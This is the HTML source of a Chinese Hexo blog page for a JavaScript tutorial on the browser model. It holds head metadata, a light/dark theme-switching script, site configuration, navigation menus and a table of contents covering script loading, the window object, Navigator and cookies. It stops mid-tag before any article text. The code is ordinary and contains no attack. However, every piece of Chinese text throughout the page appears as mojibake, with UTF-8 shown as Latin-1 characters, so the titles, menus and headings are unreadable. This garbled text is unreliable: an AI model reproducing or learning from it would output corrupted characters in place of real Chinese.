<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>â‘¦JavaScriptæ•™ç¨‹ä¹‹æµè§ˆå™¨æ¨¡å‹ | å‘é˜³æ¦†æœ¨</title><meta name="description" content="â‘¦JavaScriptæ•™ç¨‹ä¹‹æµè§ˆå™¨æ¨¡å‹"><meta name="keywords" content="JavaScript,å‰ç«¯çŸ¥è¯†,æµè§ˆå™¨æ¨¡å‹"><meta name="author" content="PanXiaoKang"><meta name="copyright" content="PanXiaoKang"><meta name="format-detection" content="telephone=no"><link rel="shortcut icon" href="/img/Lotus.ico"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="https://fonts.googleapis.com" crossorigin="crossorigin"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="google-site-verification" content="wyZknSW2XMDLHhrSvtifCN1aQwr2nn53ydI_lDzVJmI"/><meta name="baidu-site-verification" content="p1OeTLcEA8"/><meta name="twitter:card" content="summary"><meta name="twitter:title" content="â‘¦JavaScriptæ•™ç¨‹ä¹‹æµè§ˆå™¨æ¨¡å‹"><meta name="twitter:description" content="â‘¦JavaScriptæ•™ç¨‹ä¹‹æµè§ˆå™¨æ¨¡å‹"><meta name="twitter:image" content="https://ss2.bdstatic.com/70cFvnSh_Q1YnxGkpoWK1HF6hhy/it/u=1273994899,2704080463&amp;fm=26&amp;gp=0.jpg"><meta property="og:type" content="article"><meta property="og:title" content="â‘¦JavaScriptæ•™ç¨‹ä¹‹æµè§ˆå™¨æ¨¡å‹"><meta property="og:url" content="http://example.com/2021/10/17/JavaScript%E6%95%99%E7%A8%8B%E4%B9%8B%E6%B5%8F%E8%A7%88%E5%99%A8%E6%A8%A1%E5%9E%8B/"><meta property="og:site_name" content="å‘é˜³æ¦†æœ¨"><meta property="og:description" content="â‘¦JavaScriptæ•™ç¨‹ä¹‹æµè§ˆå™¨æ¨¡å‹"><meta property="og:image" content="https://ss2.bdstatic.com/70cFvnSh_Q1YnxGkpoWK1HF6hhy/it/u=1273994899,2704080463&amp;fm=26&amp;gp=0.jpg"><script src="https://cdn.jsdelivr.net/npm/js-cookie/dist/js.cookie.min.js"></script><script>var autoChangeMode = '1'
var t = Cookies.get("theme")
if (autoChangeMode == '1'){
  var isDarkMode = window.matchMedia("(prefers-color-scheme: dark)").matches
  var isLightMode = window.matchMedia("(prefers-color-scheme: light)").matches
  var isNotSpecified = window.matchMedia("(prefers-color-scheme: no-preference)").matches
  var hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified

  if (t === undefined){
    if (isLightMode) activateLightMode()
    else if (isDarkMode) activateDarkMode()
    else if (isNotSpecified || hasNoSupport){
      console.log('You specified no preference for a color scheme or your browser does not support it. I Schedule dark mode during night time.')
      var now = new Date()
      var hour = now.getHours()
      var isNight = hour < 6 || hour >= 18
      isNight ? activateDarkMode() : activateLightMode()
  }
  } else if (t == 'light') activateLightMode()
  else activateDarkMode()

} else if (autoChangeMode == '2'){
  now = new Date();
  hour = now.getHours();
  isNight = hour < 6 || hour >= 18
  if(t === undefined) isNight? activateDarkMode() : activateLightMode()
  else if (t === 'light') activateLightMode()
  else activateDarkMode() 
} else {
  if ( t == 'dark' ) activateDarkMode()
  else if ( t == 'light') activateLightMode()
}

function activateDarkMode(){
  document.documentElement.setAttribute('data-theme', 'dark')
  if (document.querySelector('meta[name="theme-color"]') !== null){
    document.querySelector('meta[name="theme-color"]').setAttribute('content','#000')
  }
}
function activateLightMode(){
  document.documentElement.setAttribute('data-theme', 'light')
  if (document.querySelector('meta[name="theme-color"]') !== null){
  document.querySelector('meta[name="theme-color"]').setAttribute('content','#fff')
  }
}</script><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css"><link rel="canonical" href="http://example.com/2021/10/17/JavaScript%E6%95%99%E7%A8%8B%E4%B9%8B%E6%B5%8F%E8%A7%88%E5%99%A8%E6%A8%A1%E5%9E%8B/"><link rel="prev" title=" â‘§JavaScriptæ•™ç¨‹ä¹‹ç½‘é¡µå…ƒç´ æ¥å£" href="http://example.com/2021/11/07/JavaScript%E6%95%99%E7%A8%8B%E4%B9%8B%E7%BD%91%E9%A1%B5%E5%85%83%E7%B4%A0%E6%8E%A5%E5%8F%A3/"><link rel="next" title="â‘¥JavaScriptæ•™ç¨‹ä¹‹äº‹ä»¶" href="http://example.com/2021/10/04/JavaScript%E6%95%99%E7%A8%8B%E4%B9%8B%E4%BA%8B%E4%BB%B6/"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Titillium+Web"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"search.xml","languages":{"hits_empty":"æ‰¾ä¸åˆ°æ‚¨æŸ¥è¯¢çš„å†…å®¹:${query}"}},
  translate: {"defaultEncoding":2,"translateDelay":0,"cookieDomain":"https://xxx/","msgToTraditionalChinese":"ç¹","msgToSimplifiedChinese":"ç°¡"},
  copy: {
    success: 'å¤åˆ¶æˆåŠŸ',
    error: 'å¤åˆ¶é”™è¯¯',
    noSupport: 'æµè§ˆå™¨ä¸æ”¯æŒ'
  },
  bookmark: {
    message_prev: 'æŒ‰',
    message_next: 'é”®å°†æœ¬é¡µåŠ å…¥ä¹¦ç­¾'
  },
  runtime_unit: 'å¤©',
  runtime: true,
  copyright: undefined,
  ClickShowText: {"text":"æœ€è¿‘æœ‰ç‚¹å¤±çœ äº†,æ¯å¤©è¢«è‡ªå·±å¸…é†’,å¸…æ—©å·²æˆä¸ºè´Ÿæ‹…,é™¤äº†å¸…ä¸€æ— æ‰€æœ‰,å¯Œå¼º,æ°‘ä¸»,æ–‡æ˜,å’Œè°,è‡ªç”±,å¹³ç­‰,å…¬æ­£,æ³•æ²»,çˆ±å›½,æ•¬ä¸š,è¯šä¿¡,å‹å–„","fontSize":"20px"},
  medium_zoom: false,
  fancybox: true,
  Snackbar: undefined,
  baiduPush: true,
  highlightCopy: true,
  highlightLang: true,
  highlightShrink: 'true',
  isFontAwesomeV5: false,
  isPhotoFigcaption: false
  
}</script><script>var GLOBAL_CONFIG_SITE = { 
  isPost: true,
  isHome: false,
  isSidebar: true  
  }</script><noscript><style>
#page-header {
  opacity: 1
}
.justified-gallery img{
  opacity: 1
}
</style></noscript><meta name="generator" content="Hexo 4.2.1"></head><body><div id="mobile-sidebar"><div id="menu_mask"></div><div id="mobile-sidebar-menus"><div class="mobile_author_icon"><img class="avatar-img" src="https://s1.ax1x.com/2020/06/09/t40ARx.th.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="mobile_post_data"><div class="mobile_data_item is-center"><div class="mobile_data_link"><a href="/archives/"><div class="headline">æ–‡ç« </div><div class="length_num">103</div></a></div></div><div class="mobile_data_item is-center">      <div class="mobile_data_link"><a href="/tags/"><div class="headline">æ ‡ç­¾</div><div class="length_num">235</div></a></div></div><div class="mobile_data_item is-center">     <div class="mobile_data_link"><a href="/categories/"><div class="headline">åˆ†ç±»</div><div class="length_num">25</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> é¦–é¡µ</span></a></div><div class="menus_item"><a class="site-page" href="/random/"><i class="fa-fw fa fa-random"></i><span> éšæœºæ–‡ç« </span></a></div><div class="menus_item"><a class="site-page"><i class="fa-fw fa fa-th-large" aria-hidden="true"></i><span> å½’æ¡£</span><i class="fa fa-chevron-down menus-expand" aria-hidden="true"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> æ—¶é—´è½´</span></a></li><li><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> æ ‡ç­¾</span></a></li><li><a class="site-page" href="/categories/"><i class="fa-fw fa fa-folder-open"></i><span> åˆ†ç±»</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/tagsnet/"><i class="fa-fw fa fa-connectdevelop"></i><span> å…³ç³»ç½‘</span></a></div><div class="menus_item"><a class="site-page"><i class="fa-fw fa fa-send-o" aria-hidden="true"></i><span> å¯¼èˆªæ </span><i class="fa fa-chevron-down menus-expand" aria-hidden="true"></i></a><ul class="menus_item_child"><li><a class="site-page" href="https://xyyum.icu/mypages/OnlyI.html" target="_blank" rel="noopener"><i class="fa-fw fa fa-send"></i><span> ä¸»é¡µå¯¼èˆª</span></a></li><li><a class="site-page" href="https://xyyum.icu/mypages/xkzhdh/Integrated.html" target="_blank" rel="noopener"><i class="fa-fw fa fa-paper-plane-o"></i><span> ç»¼åˆå¯¼èˆª</span></a></li><li><a class="site-page" href="https://xyyum.icu/mypages/software/index.html" target="_blank" rel="noopener"><i class="fa-fw fa fa-send"></i><span> è½¯ä»¶åˆ†äº«</span></a></li><li><a class="site-page" href="/sunshineBookshelf/"><i class="fa-fw fa fa-university"></i><span> å‘é˜³ä¹¦æ¶</span></a></li></ul></div><div class="menus_item"><a class="site-page"><i class="fa-fw fa fa-list" aria-hidden="true"></i><span> åˆ—è¡¨</span><i class="fa fa-chevron-down menus-expand" aria-hidden="true"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/books/"><i class="fa-fw fa fa-book"></i><span> ä¹¦ç±</span></a></li><li><a class="site-page" href="/movies/"><i class="fa-fw fa fa-film"></i><span> ç”µå½±</span></a></li><li><a class="site-page" href="/games/"><i class="fa-fw fa fa-gamepad"></i><span> æ¸¸æˆ</span></a></li><li><a class="site-page" href="/bilibili/"><i class="fa-fw fa fa-play-circle"></i><span> ç•ªå‰§</span></a></li><li><a class="site-page" href="/music/"><i class="fa-fw fa fa-music"></i><span> éŸ³ä¹</span></a></li><li><a class="site-page" href="/movie/"><i class="fa-fw fa fa-play-circle-o"></i><span> å½±è§†</span></a></li></ul></div><div class="menus_item"><a class="site-page"><i class="fa-fw fa fa-link" aria-hidden="true"></i><span> å‹æƒ…é“¾æ¥</span><i class="fa fa-chevron-down menus-expand" aria-hidden="true"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> å‹æƒ…é“¾æ¥</span></a></li><li><a class="site-page" href="https://yumuxy.gitee.io/" target="_blank" rel="noopener"><i class="fa-fw fa fa-link"></i><span> æ¡‘æ¦†æœªæ™š</span></a></li><li><a class="site-page" href="https://lllzxqq.gitee.io/" target="_blank" rel="noopener"><i class="fa-fw fa fa-link"></i><span> ååğŸ’–é›¨å­£</span></a></li></ul></div><div class="menus_item"><a class="site-page"><i class="fa-fw fa fa-user-circle-o" aria-hidden="true"></i><span> å…³äºæˆ‘</span><i class="fa fa-chevron-down menus-expand" aria-hidden="true"></i></a><ul class="menus_item_child"><li><a class="site-page" href="http://www.xbmu.edu.cn/" target="_blank" rel="noopener"><i class="fa-fw fa fa-graduation-cap"></i><span> æ¯æ ¡</span></a></li><li><a class="site-page" href="/workshop/"><i class="fa-fw fa fa-heartbeat"></i><span> ä½œå“</span></a></li><li><a class="site-page" href="/mybook/"><i class="fa-fw fa fa-book"></i><span> è‡ªä¼ </span></a></li><li><a class="site-page" href="/anires/"><i class="fa-fw fa fa-list-alt"></i><span> ç®€å†</span></a></li><li><a class="site-page" href="/vcard/"><i class="fa-fw fa fa-vcard-o"></i><span> åç‰‡</span></a></li></ul></div><div class="menus_item"><a class="site-page"><i class="fa-fw fa fa-gamepad" aria-hidden="true"></i><span> å¨±ä¹</span><i class="fa fa-chevron-down menus-expand" aria-hidden="true"></i></a><ul class="menus_item_child"><li><a class="site-page" href="https://playground.z.wiki/typing-game/index.html" target="_blank" rel="noopener"><i class="fa-fw fa fa-gamepad"></i><span> æ‰“å­—æ¸¸æˆ</span></a></li><li><a class="site-page" href="https://xyyum.icu/mypages/GreedySnake/GreedySnake.html" target="_blank" rel="noopener"><i class="fa-fw fa fa-lastfm"></i><span> è´ªåƒè›‡</span></a></li><li><a class="site-page" href="https://xyyum.icu/mypages/nineGridGame/nineGridGame.html" target="_blank" rel="noopener"><i class="fa-fw fa fa-gamepad"></i><span> æŠ½å¥–æ¸¸æˆ</span></a></li><li><a class="site-page" href="/petalage/"><i class="fa-fw fa fa-gamepad"></i><span> è¡¨ç™½æ—¶åˆ»</span></a></li><li><a class="site-page" href="/yszq/"><i class="fa-fw fa fa-gamepad"></i><span> 3Då…ƒç´ </span></a></li></ul></div><div class="menus_item"><a class="site-page"><i class="fa-fw fa fa-gear (alias)" aria-hidden="true"></i><span> å·¥å…·å¹³å°</span><i class="fa fa-chevron-down menus-expand" aria-hidden="true"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/xkdm/"><i class="fa-fw fa fa-star"></i><span> æ˜Ÿç©ºå¼¹å¹•</span></a></li><li><a class="site-page" href="https://xyym.avosapps.us/" target="_blank" rel="noopener"><i class="fa-fw fa fa-commenting-o"></i><span> è¯„è®ºç®¡ç†</span></a></li><li><a class="site-page" href="https://myhkw.cn/admin/user/login/" target="_blank" rel="noopener"><i class="fa-fw fa fa-music"></i><span> éŸ³ä¹åå°</span></a></li><li><a class="site-page" href="https://www.superbed.cn/" target="_blank" rel="noopener"><i class="fa-fw fa fa-area-chart"></i><span> èšåˆå›¾åºŠ</span></a></li><li><a class="site-page" href="/encryptedPages/"><i class="fa-fw fa fa-lock"></i><span> åŠ å¯†è®¿é—®</span></a></li></ul></div><div class="menus_item"><a class="site-page"><i class="fa-fw fa fa-heartbeat" aria-hidden="true"></i><span> çºªå¿µç©ºé—´</span><i class="fa fa-chevron-down menus-expand" aria-hidden="true"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/3d-gallery/"><i class="fa-fw fa fa-university"></i><span> 3Dç›¸å†Œå±‹</span></a></li><li><a class="site-page" href="/live-photo/"><i class="fa-fw fa fa-photo"></i><span> é’æ˜¥æ ¡å›­</span></a></li><li><a class="site-page" href="/photo-wall/"><i class="fa-fw fa fa-th"></i><span> ç”Ÿæ´»ç…§ç‰‡</span></a></li><li><a class="site-page" href="/video-wall/"><i class="fa-fw fa fa-video-camera"></i><span> åœ¨çº¿è§†é¢‘</span></a></li><li><a class="site-page" href="/mtxx/"><i class="fa-fw fa fa-file-photo-o"></i><span> ç¾å›¾ç§€ç§€</span></a></li><li><a class="site-page" href="/timeStoryline/"><i class="fa-fw fa fa-file-video-o"></i><span> æ—¶é—´æ•…äº‹çº¿</span></a></li></ul></div></div></div></div><i class="fa fa-arrow-right on" id="toggle-sidebar" aria-hidden="true">     </i><div id="sidebar"><div class="sidebar-toc"><div class="sidebar-toc__title">ç›®å½•</div><div class="sidebar-toc__progress"><span class="progress-notice">ä½ å·²ç»è¯»äº†</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar">     </div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#æµè§ˆå™¨ç¯å¢ƒæ¦‚è¿°"><span class="toc-number">1.</span> <span class="toc-text">æµè§ˆå™¨ç¯å¢ƒæ¦‚è¿°</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ä»£ç åµŒå…¥ç½‘é¡µçš„æ–¹æ³•"><span class="toc-number">1.1.</span> <span class="toc-text">ä»£ç åµŒå…¥ç½‘é¡µçš„æ–¹æ³•</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#script-å…ƒç´ åµŒå…¥ä»£ç "><span class="toc-number">1.1.1.</span> <span class="toc-text">script å…ƒç´ åµŒå…¥ä»£ç </span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#script-å…ƒç´ åŠ è½½å¤–éƒ¨è„šæœ¬"><span class="toc-number">1.1.2.</span> <span class="toc-text">script å…ƒç´ åŠ è½½å¤–éƒ¨è„šæœ¬</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#äº‹ä»¶å±æ€§"><span class="toc-number">1.1.3.</span> <span class="toc-text">äº‹ä»¶å±æ€§</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#URL-åè®®"><span class="toc-number">1.1.4.</span> <span class="toc-text">URL åè®®</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#script-å…ƒç´ "><span class="toc-number">1.2.</span> <span class="toc-text">script å…ƒç´ </span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#å·¥ä½œåŸç†"><span class="toc-number">1.2.1.</span> <span class="toc-text">å·¥ä½œåŸç†</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#defer-å±æ€§"><span class="toc-number">1.2.1.1.</span> <span class="toc-text">defer å±æ€§</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#async-å±æ€§"><span class="toc-number">1.3.</span> <span class="toc-text">async å±æ€§</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#è„šæœ¬çš„åŠ¨æ€åŠ è½½"><span class="toc-number">1.3.1.</span> <span class="toc-text">è„šæœ¬çš„åŠ¨æ€åŠ è½½</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#åŠ è½½ä½¿ç”¨çš„åè®®"><span class="toc-number">1.3.2.</span> <span class="toc-text">åŠ è½½ä½¿ç”¨çš„åè®®</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#æµè§ˆå™¨çš„ç»„æˆ"><span class="toc-number">1.4.</span> <span class="toc-text">æµè§ˆå™¨çš„ç»„æˆ</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#æ¸²æŸ“å¼•æ“"><span class="toc-number">1.4.1.</span> <span class="toc-text">æ¸²æŸ“å¼•æ“</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#é‡æµå’Œé‡ç»˜"><span class="toc-number">1.4.2.</span> <span class="toc-text">é‡æµå’Œé‡ç»˜</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#JavaScript-å¼•æ“"><span class="toc-number">1.4.3.</span> <span class="toc-text">JavaScript å¼•æ“</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#windowå¯¹è±¡"><span class="toc-number">2.</span> <span class="toc-text">windowå¯¹è±¡</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#æ¦‚è¿°"><span class="toc-number">2.1.</span> <span class="toc-text">æ¦‚è¿°</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#window-å¯¹è±¡çš„å±æ€§"><span class="toc-number">2.2.</span> <span class="toc-text">window å¯¹è±¡çš„å±æ€§</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#window-name"><span class="toc-number">2.2.1.</span> <span class="toc-text">window.name</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#window-closedï¼Œwindow-opener"><span class="toc-number">2.2.2.</span> <span class="toc-text">window.closedï¼Œwindow.opener</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#window-selfï¼Œwindow-window"><span class="toc-number">2.2.3.</span> <span class="toc-text">window.selfï¼Œwindow.window</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#window-framesï¼Œwindow-length"><span class="toc-number">2.2.4.</span> <span class="toc-text">window.framesï¼Œwindow.length</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#window-frameElement"><span class="toc-number">2.2.5.</span> <span class="toc-text">window.frameElement</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#window-topï¼Œwindow-parent"><span class="toc-number">2.2.6.</span> <span class="toc-text">window.topï¼Œwindow.parent</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#window-status"><span class="toc-number">2.2.7.</span> <span class="toc-text">window.status</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#window-devicePixelRatio"><span class="toc-number">2.2.8.</span> <span class="toc-text">window.devicePixelRatio</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ä½ç½®å¤§å°å±æ€§"><span class="toc-number">2.2.9.</span> <span class="toc-text">ä½ç½®å¤§å°å±æ€§</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ç»„ä»¶å±æ€§"><span class="toc-number">2.2.10.</span> <span class="toc-text">ç»„ä»¶å±æ€§</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#å…¨å±€å¯¹è±¡å±æ€§"><span class="toc-number">2.2.11.</span> <span class="toc-text">å…¨å±€å¯¹è±¡å±æ€§</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#window-isSecureContext"><span class="toc-number">2.2.12.</span> <span class="toc-text">window.isSecureContext</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#window-å¯¹è±¡çš„æ–¹æ³•"><span class="toc-number">2.3.</span> <span class="toc-text">window å¯¹è±¡çš„æ–¹æ³•</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#window-alert-ï¼Œwindow-prompt-ï¼Œwindow-confirm"><span class="toc-number">2.3.1.</span> <span class="toc-text">window.alert()ï¼Œwindow.prompt()ï¼Œwindow.confirm()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#window-open-window-close-ï¼Œwindow-stop"><span class="toc-number">2.3.2.</span> <span class="toc-text">window.open(), window.close()ï¼Œwindow.stop()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#window-moveTo-ï¼Œwindow-moveBy"><span class="toc-number">2.3.3.</span> <span class="toc-text">window.moveTo()ï¼Œwindow.moveBy()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#window-resizeTo-ï¼Œwindow-resizeBy"><span class="toc-number">2.3.4.</span> <span class="toc-text">window.resizeTo()ï¼Œwindow.resizeBy()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#window-scrollTo-ï¼Œwindow-scroll-ï¼Œwindow-scrollBy"><span class="toc-number">2.3.5.</span> <span class="toc-text">window.scrollTo()ï¼Œwindow.scroll()ï¼Œwindow.scrollBy()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#window-print"><span class="toc-number">2.3.6.</span> <span class="toc-text">window.print()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#window-focus-ï¼Œwindow-blur"><span class="toc-number">2.3.7.</span> <span class="toc-text">window.focus()ï¼Œwindow.blur()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#window-getSelection"><span class="toc-number">2.3.8.</span> <span class="toc-text">window.getSelection()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#window-getComputedStyle-ï¼Œwindow-matchMedia"><span class="toc-number">2.3.9.</span> <span class="toc-text">window.getComputedStyle()ï¼Œwindow.matchMedia()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#window-requestAnimationFrame"><span class="toc-number">2.3.10.</span> <span class="toc-text">window.requestAnimationFrame()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#window-requestIdleCallback"><span class="toc-number">2.3.11.</span> <span class="toc-text">window.requestIdleCallback()</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#äº‹ä»¶"><span class="toc-number">2.4.</span> <span class="toc-text">äº‹ä»¶</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#load-äº‹ä»¶å’Œ-onload-å±æ€§"><span class="toc-number">2.4.1.</span> <span class="toc-text">load äº‹ä»¶å’Œ onload å±æ€§</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#error-äº‹ä»¶å’Œ-onerror-å±æ€§"><span class="toc-number">2.4.2.</span> <span class="toc-text">error äº‹ä»¶å’Œ onerror å±æ€§</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#window-å¯¹è±¡çš„äº‹ä»¶ç›‘å¬å±æ€§"><span class="toc-number">2.4.3.</span> <span class="toc-text">window å¯¹è±¡çš„äº‹ä»¶ç›‘å¬å±æ€§</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#å¤šçª—å£æ“ä½œ"><span class="toc-number">2.5.</span> <span class="toc-text">å¤šçª—å£æ“ä½œ</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#çª—å£çš„å¼•ç”¨"><span class="toc-number">2.5.1.</span> <span class="toc-text">çª—å£çš„å¼•ç”¨</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#iframe-å…ƒç´ "><span class="toc-number">2.5.2.</span> <span class="toc-text">iframe å…ƒç´ </span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#window-frames-å±æ€§"><span class="toc-number">2.5.3.</span> <span class="toc-text">window.frames å±æ€§</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Navigator-å¯¹è±¡ï¼ŒScreen-å¯¹è±¡ã€‚"><span class="toc-number">3.</span> <span class="toc-text">Navigator å¯¹è±¡ï¼ŒScreen å¯¹è±¡ã€‚</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Navigator-å¯¹è±¡çš„å±æ€§"><span class="toc-number">3.1.</span> <span class="toc-text">Navigator å¯¹è±¡çš„å±æ€§</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Navigator-userAgent"><span class="toc-number">3.1.1.</span> <span class="toc-text">Navigator.userAgent</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Navigator-plugins"><span class="toc-number">3.1.2.</span> <span class="toc-text">Navigator.plugins</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Navigator-platform"><span class="toc-number">3.1.3.</span> <span class="toc-text">Navigator.platform</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Navigator-onLine"><span class="toc-number">3.1.4.</span> <span class="toc-text">Navigator.onLine</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Navigator-languageï¼ŒNavigator-languages"><span class="toc-number">3.1.5.</span> <span class="toc-text">Navigator.languageï¼ŒNavigator.languages</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Navigator-geolocation"><span class="toc-number">3.1.6.</span> <span class="toc-text">Navigator.geolocation</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Navigator-cookieEnabled"><span class="toc-number">3.1.7.</span> <span class="toc-text">Navigator.cookieEnabled</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Navigator-å¯¹è±¡çš„æ–¹æ³•"><span class="toc-number">3.2.</span> <span class="toc-text">Navigator å¯¹è±¡çš„æ–¹æ³•</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Navigator-javaEnabled"><span class="toc-number">3.2.1.</span> <span class="toc-text">Navigator.javaEnabled()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Navigator-sendBeacon"><span class="toc-number">3.2.2.</span> <span class="toc-text">Navigator.sendBeacon()</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Navigator-çš„å®éªŒæ€§å±æ€§"><span class="toc-number">3.3.</span> <span class="toc-text">Navigator çš„å®éªŒæ€§å±æ€§</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Navigator-deviceMemory"><span class="toc-number">3.3.1.</span> <span class="toc-text">Navigator.deviceMemory</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Navigator-hardwareConcurrency"><span class="toc-number">3.3.2.</span> <span class="toc-text">Navigator.hardwareConcurrency</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Navigator-connection"><span class="toc-number">3.3.3.</span> <span class="toc-text">Navigator.connection</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Screen-å¯¹è±¡"><span class="toc-number">3.4.</span> <span class="toc-text">Screen å¯¹è±¡</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Cookie"><span class="toc-number">4.</span> <span class="toc-text">Cookie</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#æ¦‚è¿°-1"><span class="toc-number">4.1.</span> <span class="toc-text">æ¦‚è¿°</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Cookie-ä¸-HTTP-åè®®"><span class="toc-number">4.2.</span> <span class="toc-text">Cookie ä¸ HTTP åè®®</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#HTTP-å›åº”ï¼šCookie-çš„ç”Ÿæˆ"><span class="toc-number">4.2.1.</span> <span class="toc-text">HTTP å›åº”ï¼šCookie çš„ç”Ÿæˆ</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#HTTP-è¯·æ±‚ï¼šCookie-çš„å‘é€"><span class="toc-number">4.2.2.</span> <span class="toc-text">HTTP è¯·æ±‚ï¼šCookie çš„å‘é€</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Cookie-çš„å±æ€§"><span class="toc-number">4.3.</span> <span class="toc-text">Cookie çš„å±æ€§</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Expiresï¼ŒMax-Age"><span class="toc-number">4.3.1.</span> <span class="toc-text">Expiresï¼ŒMax-Age</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Domainï¼ŒPath"><span class="toc-number">4.3.2.</span> <span class="toc-text">Domainï¼ŒPath</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Secureï¼ŒHttpOnly"><span 